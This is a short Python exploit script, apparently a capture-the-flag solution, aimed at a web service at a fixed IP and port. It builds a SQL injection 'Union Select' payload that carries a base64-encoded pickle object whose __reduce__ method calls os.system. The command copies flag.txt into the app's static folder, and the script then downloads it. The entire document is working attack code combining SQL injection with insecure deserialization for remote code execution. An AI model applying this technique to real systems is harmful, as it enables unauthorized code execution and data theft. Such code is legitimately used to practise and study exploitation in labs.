import pickle
import pickletools
from base64 import b64encode
import base64
import subprocess
import os
import requests 

urlPayload= "http://94.237.54.48:44606/view/"
url= "http://94.237.54.48:44606/"

class RCE():
    def __reduce__(self):
        cmd= 'cat flag.txt > ./application/static/flag.txt'
        return os.system, (cmd,)


payload = "' Union Select '"+base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii')

def sendRce():
    
	response = requests.get(url=urlPayload+payload)
     
	getFlag = requests.get(url=url+'static/flag.txt')
	print(getFlag.text)


sendRce()

